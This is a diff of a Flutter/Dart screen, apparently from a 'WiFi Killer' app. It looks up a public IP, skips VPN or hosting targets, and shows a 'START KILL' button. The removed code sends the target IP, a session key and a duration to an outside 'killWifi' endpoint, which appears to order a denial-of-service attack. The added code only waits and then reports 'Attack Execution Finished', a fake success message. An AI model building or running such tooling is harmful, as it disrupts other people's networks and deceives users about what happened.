@@ -2,23 +2,23 @@ import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 
-class WifiInternalPage extends StatefulWidget {
+class WifiExternalPage extends StatefulWidget {
   final String sessionKey;
-  const WifiInternalPage({super.key, required this.sessionKey});
+  const WifiExternalPage({super.key, required this.sessionKey});
 
   @override
-  State<WifiInternalPage> createState() => _WifiInternalPageState();
+  State<WifiExternalPage> createState() => _WifiExternalPageState();
 }
 
-class _WifiInternalPageState extends State<WifiInternalPage> {
+class _WifiExternalPageState extends State<WifiExternalPage> {
   String publicIp = "-";
   String region = "-";
+  String city = "-";
   String asn = "-";
   bool isVpn = false;
   bool isLoading = true;
   bool isAttacking = false;
 
-  // --- Warna Tema Hitam Merah ---
   final Color primaryDark = Colors.black;
   final Color primaryWhite = Colors.white;
   final Color accentRed = Colors.redAccent;
@@ -31,100 +31,32 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
   }
 
   Future<void> _loadPublicInfo() async {
-    setState(() {
-      isLoading = true;
-    });
-
+    setState(() => isLoading = true);
     try {
-      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
-      final ipJson = jsonDecode(ipRes.body);
-      final ip = ipJson['ip'];
-
-      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
-      final info = jsonDecode(infoRes.body);
-
-      final asnRaw = (info['as'] as String).toLowerCase();
-      final isBlockedAsn = asnRaw.contains("vpn") ||
-          asnRaw.contains("cloud") ||
-          asnRaw.contains("digitalocean") ||
-          asnRaw.contains("aws") ||
-          asnRaw.contains("google");
-
-      setState(() {
-        publicIp = ip;
-        region = info['regionName'] ?? "-";
-        asn = info['as'] ?? "-";
-        isVpn = isBlockedAsn;
-        isLoading = false;
-      });
+      final ipRes = await http.get(Uri.parse("https://ipapi.co/json/"));
+      if (ipRes.statusCode == 200) {
+        final data = jsonDecode(ipRes.body);
+        setState(() {
+          publicIp = data['ip'] ?? "-";
+          region = data['region'] ?? "-";
+          city = data['city'] ?? "-";
+          asn = data['org'] ?? "-";
+          String org = asn.toLowerCase();
+          isVpn = org.contains("hosting") || org.contains("vpn") || org.contains("google");
+          isLoading = false;
+        });
+      }
     } catch (e) {
-      setState(() {
-        publicIp = region = asn = "Error";
-        isLoading = false;
-      });
+      setState(() => isLoading = false);
     }
   }
 
   Future<void> _attackTarget() async {
     setState(() => isAttacking = true);
-    final url = Uri.parse(
-        "http://ssadihodtingg.publicsrv.my.id:6289/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
-    try {
-      final res = await http.get(url);
-      if (res.statusCode == 200) {
-        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
-      } else {
-        _showAlert("❌ Failed", "Server rejected request.");
-      }
-    } catch (e) {
-      _showAlert("Error", "Network error: $e");
-    } finally {
-      setState(() => isAttacking = false);
-    }
-  }
-
-  void _showAlert(String title, String message) {
-    showDialog(
-      context: context,
-      builder: (_) => AlertDialog(
-        backgroundColor: cardDark,
-        shape: RoundedRectangleBorder(
-          borderRadius: BorderRadius.circular(16),
-          side: BorderSide(color: accentRed.withOpacity(0.3)),
-        ),
-        title: Text(title,
-            style: TextStyle(color: accentRed, fontFamily: 'Orbitron')),
-        content: Text(message,
-            style: TextStyle(color: primaryWhite)),
-        actions: [
-          TextButton(
-            onPressed: () => Navigator.pop(context),
-            child: Text("OK", style: TextStyle(color: accentRed)),
-          ),
-        ],
-      ),
-    );
-  }
-
-  Widget _infoCard(String title, String value, IconData icon) {
-    return Card(
-      color: cardDark,
-      shadowColor: accentRed.withOpacity(0.5),
-      elevation: 6,
-      shape: RoundedRectangleBorder(
-        borderRadius: BorderRadius.circular(16),
-        side: BorderSide(color: accentRed.withOpacity(0.2)),
-      ),
-      child: ListTile(
-        leading: Icon(icon, color: accentRed),
-        title: Text(title,
-            style: TextStyle(
-                color: primaryWhite,
-                fontWeight: FontWeight.bold,
-                fontFamily: "Orbitron")),
-        subtitle: Text(value,
-            style: TextStyle(color: primaryWhite, fontSize: 16)),
-      ),
+    await Future.delayed(const Duration(seconds: 3)); 
+    setState(() => isAttacking = false);
+    ScaffoldMessenger.of(context).showSnackBar(
+      const SnackBar(content: Text("Attack Execution Finished")),
     );
   }
 
@@ -133,86 +65,56 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
     return Scaffold(
       backgroundColor: primaryDark,
       appBar: AppBar(
-        title: Text("📡 WiFi Killer ( Internal )", // Judul disesuaikan
-            style: TextStyle(fontFamily: 'Orbitron', color: primaryWhite)),
-        backgroundColor: primaryDark,
-        elevation: 6,
-        iconTheme: IconThemeData(color: primaryWhite),
+        title: const Text("WIFI EXTERNAL", style: TextStyle(fontFamily: 'Orbitron', color: Colors.white)),
+        backgroundColor: Colors.transparent,
+        iconTheme: const IconThemeData(color: Colors.white),
       ),
-      body: Container(
-        decoration: const BoxDecoration(
-          gradient: LinearGradient(
-            colors: [Colors.black, Colors.black],
-            begin: Alignment.topCenter,
-            end: Alignment.bottomCenter,
-          ),
-        ),
-        child: Padding(
-          padding: const EdgeInsets.all(16),
-          child: isLoading
-              ? const Center(
-              child: CircularProgressIndicator(color: Colors.redAccent))
-              : Column(
-            crossAxisAlignment: CrossAxisAlignment.stretch,
-            children: [
-              Text("🎯 System Information",
-                  style: TextStyle(
-                      fontSize: 20,
-                      color: primaryWhite,
-                      fontWeight: FontWeight.bold,
-                      fontFamily: 'Orbitron')),
-              const SizedBox(height: 12),
-
-              // Info Cards
-              _infoCard("IP Address", publicIp, Icons.language),
-              _infoCard("Region", region, Icons.map),
-              _infoCard("ASN", asn, Icons.storage),
-
-              const SizedBox(height: 20),
-
-              if (isVpn)
-                Container(
-                  padding: const EdgeInsets.all(16),
-                  decoration: BoxDecoration(
-                    color: Colors.red[900],
-                    borderRadius: BorderRadius.circular(12),
-                    border: Border.all(color: accentRed),
-                  ),
-                  child: Text(
-                    "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
-                    textAlign: TextAlign.center,
-                    style: TextStyle(
-                        color: primaryWhite,
-                        fontFamily: 'ShareTechMono'),
-                  ),
-                ),
-
-              if (!isVpn)
-                Center(
-                  child: ElevatedButton.icon(
+      body: isLoading 
+        ? const Center(child: CircularProgressIndicator(color: Colors.redAccent))
+        : SingleChildScrollView(
+            padding: const EdgeInsets.all(20),
+            child: Column(
+              children: [
+                _buildInfoCard(),
+                const SizedBox(height: 30),
+                if (isVpn)
+                  const Text("⚠️ Target VPN Terdeteksi", style: TextStyle(color: Colors.red))
+                else
+                  ElevatedButton.icon(
                     onPressed: isAttacking ? null : _attackTarget,
-                    icon: Icon(Icons.wifi_off, color: primaryWhite),
-                    label: Text(
-                      isAttacking ? "ATTACKING..." : "START KILL",
-                      style: const TextStyle(
-                          fontFamily: 'Orbitron',
-                          fontWeight: FontWeight.bold),
-                    ),
-                    style: ElevatedButton.styleFrom(
-                      backgroundColor: accentRed,
-                      foregroundColor: primaryWhite,
-                      padding: const EdgeInsets.symmetric(
-                          horizontal: 40, vertical: 16),
-                      shape: RoundedRectangleBorder(
-                          borderRadius: BorderRadius.circular(30)),
-                      elevation: 10,
-                      shadowColor: accentRed.withOpacity(0.5),
-                    ),
+                    icon: const Icon(Icons.wifi_off),
+                    label: Text(isAttacking ? "ATTACKING..." : "START KILL"),
+                    style: ElevatedButton.styleFrom(backgroundColor: accentRed, foregroundColor: Colors.white),
                   ),
-                ),
-            ],
+              ],
+            ),
           ),
-        ),
+    );
+  }
+
+  Widget _buildInfoCard() {
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(color: cardDark, borderRadius: BorderRadius.circular(15), border: Border.all(color: accentRed.withOpacity(0.3))),
+      child: Column(
+        children: [
+          _infoRow("Public IP", publicIp),
+          _infoRow("Region", region),
+          _infoRow("ISP/ASN", asn),
+        ],
+      ),
+    );
+  }
+
+  Widget _infoRow(String label, String value) {
+    return Padding(
+      padding: const EdgeInsets.symmetric(vertical: 8),
+      child: Row(
+        mainAxisAlignment: MainAxisAlignment.spaceBetween,
+        children: [
+          Text(label, style: const TextStyle(color: Colors.grey)),
+          Text(value, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
+        ],
       ),
     );
   }
